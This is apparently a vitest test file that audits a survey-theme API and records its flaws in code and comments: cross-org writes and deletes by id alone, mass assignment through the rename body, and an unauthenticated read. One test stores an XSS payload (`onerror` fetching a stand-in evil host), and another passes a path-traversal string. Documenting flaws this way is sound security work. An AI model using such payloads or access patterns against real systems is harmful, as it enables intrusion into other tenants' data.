import { beforeEach, describe, expect, test, vi } from "vitest";

vi.mock("../../utils/prisma.js", () => ({
  default: {
    webSurveyTheme: {
      create: vi.fn(),
      findFirst: vi.fn(),
      findMany: vi.fn(),
      findUnique: vi.fn(),
      update: vi.fn(),
      delete: vi.fn(),
    },
    survey: { update: vi.fn() },
    $transaction: vi.fn(),
  },
}));

vi.mock("../../utils/logger.js", () => ({
  log: { error: vi.fn(), info: vi.fn(), trace: vi.fn(), warn: vi.fn(), debug: vi.fn() },
}));

vi.mock("../../utils/checkSession.js", () => ({ checkSession: vi.fn() }));
vi.mock("../../utils/auth.js", () => ({ assertRootOrg: vi.fn() }));

import prisma from "../../utils/prisma.js";
import { log } from "../../utils/logger.js";
import { checkSession } from "../../utils/checkSession.js";
import { assertRootOrg } from "../../utils/auth.js";
import { defaultTheme, defaultThemeOld, defaultWebSurveyPagesTheme } from "./defaultTheme.js";
import {
  createAndApplyThemeToSurvey,
  deleteThemeInDB,
  getAllThemesOfUserOrgFromDB,
  getSurveyThemeById,
  renameThemeInDB,
  updateSurveyThemeActiveSurveyThemeInDB,
} from "./surveyTheme.service.js";
import {
  createNewTheme,
  deleteTheme,
  errorHandler,
  getAllThemesOfUserOrg,
  getSurveyThemeByIdHandler,
  renameTheme,
  updateAllWebSurveyThemesJson,
  updateSurveyThemeHandler,
} from "./surveyTheme.controller.js";
import { surveyThemeRoutes } from "./surveyTheme.routes.js";
import { getImgUrl, verifyAndConvertSurveyThemeObj } from "./utils.js";

type Mock = ReturnType<typeof vi.fn>;

const db = prisma as unknown as {
  webSurveyTheme: Record<string, Mock>;
  survey: Record<string, Mock>;
  $transaction: Mock;
};

const ORG = "11111111-1111-1111-1111-111111111111";
const VICTIM_ORG = "22222222-2222-2222-2222-222222222222";
const VICTIM_THEME = "3f8a1e2c-5b7d-4c9e-8a1b-2d3e4f5a6b7c";
const VICTIM_SURVEY = "7c6b5a4f-3e2d-4b1a-9c8d-7e6f5a4b3c2d";

function reply() {
  const rep: any = { code: vi.fn(() => rep), status: vi.fn(() => rep), send: vi.fn(() => rep) };
  return rep;
}

function answer(rep: any) {
  return {
    code: rep.code.mock.calls[0]?.[0] ?? rep.status.mock.calls[0]?.[0],
    body: rep.send.mock.calls[0]?.[0],
  };
}

beforeEach(() => {
  vi.clearAllMocks();
  // clearAllMocks keeps implementations but drops queued values.
  db.webSurveyTheme.create.mockResolvedValue({ id: "theme-1", name: "New" });
  db.webSurveyTheme.findFirst.mockResolvedValue(null);
  db.webSurveyTheme.findMany.mockResolvedValue([]);
  db.webSurveyTheme.findUnique.mockResolvedValue(null);
  db.webSurveyTheme.update.mockResolvedValue({ id: VICTIM_THEME });
  db.webSurveyTheme.delete.mockResolvedValue({ id: VICTIM_THEME });
  db.survey.update.mockResolvedValue({ id: VICTIM_SURVEY });
  db.$transaction.mockImplementation(async (fn: any) => fn(db));
});

// ===========================================================================
// Writing another org's theme
// ===========================================================================

describe("updateSurveyThemeActiveSurveyThemeInDB", () => {
  const req = (over: any = {}) => ({
    params: { webSurveyThemeId: VICTIM_THEME },
    body: { surveyId: VICTIM_SURVEY, theme: { surveyTheme: { title: { title: "<h3>Hi</h3>" } } } },
    user: { orgId: ORG },
    ...over,
  });

  // NOTE: the theme id comes from the path, the survey id from the body, and
  // neither is resolved to an org. getAllThemesOfUserOrgFromDB in the same file
  // filters on orgId, so the scoped read exists and is not used here.
  test("writes the theme selected by id alone", async () => {
    db.webSurveyTheme.findFirst.mockResolvedValueOnce({ name: "Brand" });

    await updateSurveyThemeActiveSurveyThemeInDB(req());

    expect(db.webSurveyTheme.update.mock.calls[0][0].where).toEqual({ id: VICTIM_THEME });
  });

  // NOTE: theme titles are stored as raw HTML — defaultTheme.ts:64, :88 and :96
  // hold `<h3 ...>Welcome</h3><p ...>` — so the theme JSON is markup that the
  // public survey page renders.
  test("stores whatever JSON the body carried, markup included", async () => {
    db.webSurveyTheme.findFirst.mockResolvedValueOnce({ name: "Brand" });
    const theme = {
      surveyTheme: { title: { title: `<img src=x onerror="fetch('https://evil.test')">` } },
    };

    await updateSurveyThemeActiveSurveyThemeInDB(req({ body: { surveyId: VICTIM_SURVEY, theme } }));

    expect(db.webSurveyTheme.update.mock.calls[0][0].data).toEqual({ theme });
  });

  test("the shipped page themes are themselves markup", () => {
    expect((defaultThemeOld as any).welcomeTheme.title.title).toContain("<h3");
    expect((defaultThemeOld as any).thankyouTheme.title.title).toContain("<p");
    expect((defaultWebSurveyPagesTheme as any).languageTheme.title.title).toContain("<h3");
  });

  // NOTE: defaultTheme — the value createAndApplyThemeToSurvey writes — holds
  // only surveyTheme. The welcome, thankyou and language pages live in
  // defaultThemeOld, so a newly created theme has a different shape from the
  // one verifyAndConvertSurveyThemeObj expects to read.
  test("the theme new rows are seeded with has only the survey page", () => {
    expect(Object.keys(defaultTheme)).toEqual(["surveyTheme"]);
    expect(Object.keys(defaultThemeOld)).toContain("welcomeTheme");
  });

  test("the converter dereferences a page the seeded theme does not have", () => {
    expect(() => verifyAndConvertSurveyThemeObj(defaultTheme)).toThrow(TypeError);
  });

  // NOTE: the survey update runs unconditionally and is keyed on the body's
  // surveyId with no org condition, so any survey can be pointed at any theme.
  test("applies the theme to whatever survey the body names", async () => {
    await updateSurveyThemeActiveSurveyThemeInDB(req());

    expect(db.survey.update).toHaveBeenCalledWith({
      where: { id: VICTIM_SURVEY },
      data: { webSurveyThemeId: VICTIM_THEME },
    });
  });

  test("the handler never consults the session org", async () => {
    const request: any = {
      params: { webSurveyThemeId: VICTIM_THEME },
      body: { surveyId: VICTIM_SURVEY, theme: {} },
      get user() {
        throw new Error("request.user was read");
      },
    };

    await expect(updateSurveyThemeHandler(request, reply())).resolves.toBeUndefined();
    expect(db.survey.update).toHaveBeenCalledOnce();
  });

  // NOTE: the only thing standing between a caller and overwriting a theme is
  // a comparison against the display name "Default Theme".
  test("a theme named Default Theme is left alone", async () => {
    db.webSurveyTheme.findFirst.mockResolvedValueOnce({ name: "Default Theme" });

    const res = await updateSurveyThemeActiveSurveyThemeInDB(req());

    expect(db.webSurveyTheme.update).not.toHaveBeenCalled();
    expect(res).toEqual({ success: true, message: "Applied theme succesfully." });
  });

  test("the guard is an exact string match", async () => {
    db.webSurveyTheme.findFirst.mockResolvedValueOnce({ name: "default theme" });

    await updateSurveyThemeActiveSurveyThemeInDB(req());

    expect(db.webSurveyTheme.update).toHaveBeenCalledOnce();
  });

  // NOTE: a theme id that resolves to nothing skips the theme write but still
  // repoints the survey.
  test("an unknown theme id still repoints the survey", async () => {
    await updateSurveyThemeActiveSurveyThemeInDB(req());

    expect(db.webSurveyTheme.update).not.toHaveBeenCalled();
    expect(db.survey.update).toHaveBeenCalledOnce();
  });

  test("the two writes are not in a transaction", async () => {
    db.webSurveyTheme.findFirst.mockResolvedValueOnce({ name: "Brand" });

    await updateSurveyThemeActiveSurveyThemeInDB(req());

    expect(db.$transaction).not.toHaveBeenCalled();
  });
});

// ===========================================================================
// renameThemeInDB — the update body is spread wholesale
// ===========================================================================

describe("renameThemeInDB", () => {
  test("selects the theme by id alone", async () => {
    await renameThemeInDB({
      params: { webSurveyThemeId: VICTIM_THEME },
      body: { name: "Renamed" },
    });

    expect(db.webSurveyTheme.update.mock.calls[0][0].where).toEqual({ id: VICTIM_THEME });
  });

  // NOTE: `data: { ...body }` with no body schema on the route — every column
  // of WebSurveyTheme is reachable, not just name.
  test("spreads the whole request body into the update", async () => {
    await renameThemeInDB({
      params: { webSurveyThemeId: VICTIM_THEME },
      body: { name: "Renamed", orgId: VICTIM_ORG, theme: { injected: true } },
    });

    expect(db.webSurveyTheme.update.mock.calls[0][0].data).toEqual({
      name: "Renamed",
      orgId: VICTIM_ORG,
      theme: { injected: true },
    });
  });

  test("an orgId in the body re-parents the theme", async () => {
    await renameThemeInDB({
      params: { webSurveyThemeId: VICTIM_THEME },
      body: { name: "x", orgId: VICTIM_ORG },
    });

    expect(db.webSurveyTheme.update.mock.calls[0][0].data.orgId).toBe(VICTIM_ORG);
  });

  // NOTE: renaming away from "Default Theme" is what unlocks the write guard in
  // updateSurveyThemeActiveSurveyThemeInDB.
  test("renaming is the way past the Default Theme guard", async () => {
    await renameThemeInDB({
      params: { webSurveyThemeId: VICTIM_THEME },
      body: { name: "Not Default Any More" },
    });

    expect(db.webSurveyTheme.update.mock.calls[0][0].data.name).toBe("Not Default Any More");
  });

  test("the handler only checks that a name is present", async () => {
    const rep = reply();

    await renameTheme({ params: { webSurveyThemeId: VICTIM_THEME }, body: {} } as never, rep);

    expect(answer(rep).code).toBe(400);
    expect(db.webSurveyTheme.update).not.toHaveBeenCalled();
  });

  test("any non-empty name lets the rest of the body through", async () => {
    const rep = reply();

    await renameTheme(
      {
        params: { webSurveyThemeId: VICTIM_THEME },
        body: { name: "x", orgId: VICTIM_ORG },
      } as never,
      rep,
    );

    expect(db.webSurveyTheme.update.mock.calls[0][0].data.orgId).toBe(VICTIM_ORG);
    expect(answer(rep).code).toBe(200);
  });
});

// ===========================================================================
// deleteThemeInDB
// ===========================================================================

describe("deleteThemeInDB", () => {
  test("deletes by id alone", async () => {
    await deleteThemeInDB({ params: { webSurveyThemeId: VICTIM_THEME } });

    expect(db.webSurveyTheme.delete).toHaveBeenCalledWith({ where: { id: VICTIM_THEME } });
  });

  test("the handler reports success without reading the session", async () => {
    const request: any = {
      params: { webSurveyThemeId: VICTIM_THEME },
      get user() {
        throw new Error("request.user was read");
      },
    };
    const rep = reply();

    await deleteTheme(request, rep);

    expect(answer(rep)).toEqual({
      code: 200,
      body: { success: true, message: "theme deleted successfully" },
    });
  });
});

// ===========================================================================
// The public read
// ===========================================================================

describe("getSurveyThemeById", () => {
  test("selects by id with no org condition", async () => {
    await getSurveyThemeById(VICTIM_THEME);

    expect(db.webSurveyTheme.findUnique).toHaveBeenCalledWith({ where: { id: VICTIM_THEME } });
  });

  test("the handler sends only the theme JSON", async () => {
    db.webSurveyTheme.findUnique.mockResolvedValueOnce({
      id: VICTIM_THEME,
      orgId: VICTIM_ORG,
      name: "Brand",
      theme: { surveyTheme: {} },
    });
    const rep = reply();

    await getSurveyThemeByIdHandler({ params: { webSurveyThemeId: VICTIM_THEME } } as never, rep);

    expect(answer(rep)).toEqual({ code: 200, body: { surveyTheme: {} } });
  });

  // NOTE: the destructure has no null guard, so an id that resolves to nothing
  // throws — on a route that is registered as public.
  test("throws on an id that does not resolve", async () => {
    await expect(
      getSurveyThemeByIdHandler({ params: { webSurveyThemeId: VICTIM_THEME } } as never, reply()),
    ).rejects.toThrow(TypeError);
  });

  test("the module's error handler turns that into a fixed 500", () => {
    const rep = reply();

    errorHandler(new TypeError("Cannot destructure"), {} as never, rep);

    expect(answer(rep)).toEqual({ code: 500, body: { message: "Something went wrong" } });
    expect(log.error).toHaveBeenCalled();
  });
});

// ===========================================================================
// The org-scoped reader and the creator
// ===========================================================================

describe("the scoped paths", () => {
  test("the listing filters on the caller's org", async () => {
    await getAllThemesOfUserOrgFromDB({ user: { orgId: ORG } });

    expect(db.webSurveyTheme.findMany.mock.calls[0][0].where).toEqual({ orgId: ORG });
  });

  // NOTE: a request with no user yields `orgId: undefined`, and Prisma drops
  // undefined from a where clause — so the listing would return every org's
  // themes. The route hook makes this unreachable today.
  test("a missing session leaves the org filter undefined", async () => {
    await getAllThemesOfUserOrgFromDB({});

    expect(db.webSurveyTheme.findMany.mock.calls[0][0].where).toEqual({ orgId: undefined });
  });

  test("the listing marks themes already used by a survey", async () => {
    db.webSurveyTheme.findMany.mockResolvedValueOnce([
      { id: "t-1", name: "A", theme: {}, survey: [{ title: "NPS" }] },
      { id: "t-2", name: "B", theme: {}, survey: [] },
    ]);
    const rep = reply();

    await getAllThemesOfUserOrg({ user: { orgId: ORG } } as never, rep);

    expect(answer(rep).body.map((t: any) => t.activeInAnotherSurvey)).toEqual([true, false]);
    expect(answer(rep).body[0]).not.toHaveProperty("survey");
  });

  test("create stamps the caller's org and the shipped default", async () => {
    await createAndApplyThemeToSurvey({
      user: { orgId: ORG },
      body: { themeName: "Brand", surveyId: VICTIM_SURVEY },
    });

    expect(db.webSurveyTheme.create.mock.calls[0][0].data).toEqual({
      orgId: ORG,
      name: "Brand",
      theme: defaultTheme,
    });
  });

  // NOTE: the theme is created in the caller's org, then applied to whatever
  // survey the body names — the survey update carries no org condition.
  test("create applies the new theme to any survey the body names", async () => {
    await createAndApplyThemeToSurvey({
      user: { orgId: ORG },
      body: { themeName: "Brand", surveyId: VICTIM_SURVEY },
    });

    expect(db.survey.update.mock.calls[0][0].where).toEqual({ id: VICTIM_SURVEY });
  });

  test("both writes share one transaction", async () => {
    await createAndApplyThemeToSurvey({
      user: { orgId: ORG },
      body: { themeName: "Brand", surveyId: VICTIM_SURVEY },
    });

    expect(db.$transaction).toHaveBeenCalledOnce();
  });

  // NOTE: the controller types surveyId as optional, but the transaction
  // always runs survey.update — so a create with no survey rolls the new theme
  // back too.
  test("a create with no surveyId rolls the theme back", async () => {
    db.survey.update.mockRejectedValueOnce(
      Object.assign(new Error("Argument `where` needs at least one argument"), { code: "P2025" }),
    );

    await expect(
      createAndApplyThemeToSurvey({ user: { orgId: ORG }, body: { themeName: "Brand" } }),
    ).rejects.toThrow();
    expect(db.webSurveyTheme.create).toHaveBeenCalledOnce();
  });

  test("a duplicate theme name in the org answers 400", async () => {
    db.webSurveyTheme.create.mockRejectedValueOnce(
      Object.assign(new Error("Unique constraint failed"), { code: "P2002" }),
    );
    const rep = reply();

    await createNewTheme(
      { user: { orgId: ORG }, body: { themeName: "Brand", surveyId: VICTIM_SURVEY } } as never,
      rep,
    );

    expect(answer(rep)).toEqual({
      code: 400,
      body: { success: false, message: "A theme with the same name already exists." },
    });
  });

  test("any other create failure is rethrown to the error handler", async () => {
    db.webSurveyTheme.create.mockRejectedValueOnce(new Error("db down"));

    await expect(
      createNewTheme(
        { user: { orgId: ORG }, body: { themeName: "Brand", surveyId: VICTIM_SURVEY } } as never,
        reply(),
      ),
    ).rejects.toThrow("db down");
  });
});

// ===========================================================================
// The migration endpoint
// ===========================================================================

describe("updateAllWebSurveyThemesJson", () => {
  // NOTE: the call is commented out (surveyTheme.controller.ts:97), so the
  // endpoint answers success without doing anything.
  test("answers 200 without touching the database", async () => {
    const rep = reply();

    await updateAllWebSurveyThemesJson({} as never, rep);

    expect(db.webSurveyTheme.findMany).not.toHaveBeenCalled();
    expect(db.$transaction).not.toHaveBeenCalled();
    expect(answer(rep).code).toBe(200);
    expect(answer(rep).body.message).toContain("No Json changes needed");
  });
});

// ===========================================================================
// utils
// ===========================================================================

describe("getImgUrl", () => {
  test("passes an absolute url through", () => {
    expect(getImgUrl("https://cdn.test/a.png")).toBe("https://cdn.test/a.png");
    expect(getImgUrl("http://cdn.test/a.png")).toBe("http://cdn.test/a.png");
  });

  // NOTE: a hardcoded CloudFront host, over http, with the caller's string
  // appended and no encoding.
  test("prefixes a bare key with a hardcoded http CloudFront host", () => {
    expect(getImgUrl("images/a.png")).toBe("http://d2uj946b0i8y27.cloudfront.net/images/a.png");
  });

  test("treats a colour as not an image", () => {
    expect(getImgUrl("#f7f7f7")).toBe("");
  });

  test("an empty or absent value yields an empty string", () => {
    expect(getImgUrl("")).toBe("");
    expect(getImgUrl(undefined)).toBe("");
    expect(getImgUrl(null)).toBe("");
  });

  test("a path-traversal style key is appended unchanged", () => {
    expect(getImgUrl("../../etc/passwd")).toBe(
      "http://d2uj946b0i8y27.cloudfront.net/../../etc/passwd",
    );
  });
});

// ===========================================================================
// Route registration
// ===========================================================================

describe("surveyThemeRoutes", () => {
  async function collect() {
    const routes: any[] = [];
    let onRoute: any;
    const srv: any = {
      addHook: vi.fn((name, fn) => {
        if (name === "onRoute") onRoute = fn;
      }),
      setErrorHandler: vi.fn(),
      get: vi.fn((url, opts, handler) => routes.push({ method: "GET", url, opts, handler })),
      post: vi.fn((url, opts, handler) => routes.push({ method: "POST", url, opts, handler })),
      put: vi.fn((url, opts, handler) => routes.push({ method: "PUT", url, opts, handler })),
      patch: vi.fn((url, opts, handler) => routes.push({ method: "PATCH", url, opts, handler })),
      delete: vi.fn((url, opts, handler) => routes.push({ method: "DELETE", url, opts, handler })),
    };

    await surveyThemeRoutes(srv);

    // Replay the hook Fastify would run for each registration, so the resolved
    // preHandler list is what the route would actually get.
    const resolved = routes.map((r) => {
      const routeOptions: any = { method: r.method, url: r.url, ...r.opts };
      onRoute(routeOptions);
      return { ...r, preHandler: routeOptions.preHandler };
    });
    return { srv, routes: resolved };
  }

  test("registers seven routes", async () => {
    const { routes } = await collect();

    expect(routes.map((r) => `${r.method} ${r.url}`)).toEqual([
      "GET /:webSurveyThemeId",
      "GET /",
      "POST /",
      "PUT /:webSurveyThemeId",
      "PATCH /:webSurveyThemeId",
      "DELETE /:webSurveyThemeId",
      "POST /updateWebSurveyThemes",
    ]);
  });

  // NOTE: the by-id read is declared public, so the hook clears its preHandler
  // list entirely.
  test("leaves the by-id read unauthenticated", async () => {
    const { routes } = await collect();

    expect(routes[0].preHandler).toEqual([]);
  });

  test("puts checkSession on every other route", async () => {
    const { routes } = await collect();

    for (const r of routes.slice(1)) {
      expect(r.preHandler).toContain(checkSession);
    }
  });

  test("adds the root-org check only to the migration route", async () => {
    const { routes } = await collect();

    const gated = routes.filter((r) => r.preHandler?.includes(assertRootOrg));
    expect(gated.map((r) => r.url)).toEqual(["/updateWebSurveyThemes"]);
  });

  // NOTE: the hook assigns to routeOptions.preHandler rather than appending, so
  // any preHandler a route declared for itself would be discarded.
  test("the hook replaces a route's own preHandler rather than appending", async () => {
    const { routes } = await collect();
    let onRoute: any;
    const srv: any = {
      addHook: vi.fn((name, fn) => {
        if (name === "onRoute") onRoute = fn;
      }),
      setErrorHandler: vi.fn(),
      get: vi.fn(),
      post: vi.fn(),
      put: vi.fn(),
      patch: vi.fn(),
      delete: vi.fn(),
    };
    await surveyThemeRoutes(srv);

    const own = vi.fn();
    const routeOptions: any = { preHandler: [own], config: {} };
    onRoute(routeOptions);

    expect(routeOptions.preHandler).toEqual([checkSession]);
    expect(routes).toHaveLength(7);
  });

  // NOTE: not one route declares a body or params schema, and the module's own
  // surveyTheme.schema.ts is not imported by the route file at all.
  test("no route validates anything", async () => {
    const { routes } = await collect();

    for (const r of routes) {
      expect(r.opts?.schema).toBeUndefined();
    }
  });

  test("installs the module's own error handler", async () => {
    const { srv } = await collect();

    expect(srv.setErrorHandler).toHaveBeenCalledWith(errorHandler);
  });
});
